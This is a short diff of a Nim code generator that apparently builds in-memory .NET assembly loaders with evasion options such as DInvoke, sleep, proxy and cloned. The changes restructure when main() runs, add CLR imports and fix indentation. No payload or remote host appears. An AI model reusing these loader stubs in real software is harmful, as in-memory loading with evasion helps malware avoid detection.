@@ -972,15 +972,11 @@ let LoadAssemblyStubArgs = """
     assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
     discard calcHard()
 
-when not defined(proxy):
-    when not defined(service):
-        when not defined(cloned):
-            discard main(nil)
-
 when defined(defaultMain):
     when not defined(service):
         when not defined(cloned):
-            discard main(nil)
+            when not defined(proxy):
+                discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
@@ -1366,7 +1362,7 @@ import ptr_math
 #from winim import winstr,winimbase,windef
 
 when defined(csharp):
-    from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
+    from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR,clrVariantToString,new
     from os import paramCount,paramStr
 
 when defined(sleep):
@@ -1938,10 +1934,10 @@ when not defined(DInvoke):
         from winim import GetModuleInformation
         type
           MODULEINFO {.pure.} = object
-          lpBaseOfDll: LPVOID
-          SizeOfImage: DWORD
-          EntryPoint: LPVOID
-        LPMODULEINFO = ptr MODULEINFO
+            lpBaseOfDll: LPVOID
+            SizeOfImage: DWORD
+            EntryPoint: LPVOID
+          LPMODULEINFO = ptr MODULEINFO
 
 
 proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
